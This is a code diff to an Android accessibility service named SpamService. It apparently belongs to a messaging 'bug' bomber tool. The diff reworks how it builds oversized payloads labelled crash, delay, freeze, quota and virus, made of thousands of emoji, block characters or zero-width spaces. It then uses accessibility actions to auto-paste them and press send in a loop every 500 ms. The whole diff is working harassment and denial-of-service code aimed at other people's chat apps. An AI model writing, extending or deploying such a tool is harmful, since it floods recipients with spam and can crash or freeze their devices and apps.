@@ -28,16 +28,13 @@ public class SpamService extends AccessibilityService {
                 isSending = true;
                 StringBuilder sb = new StringBuilder();
 
-                if (MainActivity.bugType.equals("crash")) {
-                    for (int i = 0; i < 3000; i++) sb.append("⚡");
-                } else if (MainActivity.bugType.equals("delay")) {
-                    for (int i = 0; i < 5000; i++) sb.append("\u200B");
-                } else if (MainActivity.bugType.equals("freeze")) {
-                    sb.append("FULL FREEZE INITIATED ");
-                    for (int i = 0; i < 200; i++) sb.append("🔥");
-                } else if (MainActivity.bugType.equals("quota")) {
-                    sb.append("QUOTA EXHAUST: ");
-                    for (int i = 0; i < 500; i++) sb.append("█");
+                switch (MainActivity.bugType) {
+                    case "crash": for (int i = 0; i < 3000; i++) sb.append("⚡"); break;
+                    case "delay": for (int i = 0; i < 5000; i++) sb.append("\u200B"); break;
+                    case "freeze": sb.append("FREEZE: "); for (int i = 0; i < 300; i++) sb.append("🔥"); break;
+                    case "quota": sb.append("QUOTA: "); for (int i = 0; i < 1000; i++) sb.append("█"); break;
+                    case "virus": sb.append("VIRUS: "); for (int i = 0; i < 1000; i++) sb.append("☣️"); break;
+                    case "call": sb.append("📞 CALLING..."); break; // Dummy payload buat call
                 }
 
                 inputBox.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
@@ -48,8 +45,7 @@ public class SpamService extends AccessibilityService {
                 sendBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                 count++;
 
-                int delay = MainActivity.bugType.equals("freeze") ? 300 : 800;
-                new Handler(Looper.getMainLooper()).postDelayed(() -> isSending = false, delay);
+                new Handler(Looper.getMainLooper()).postDelayed(() -> isSending = false, 500);
             }
         }
     }
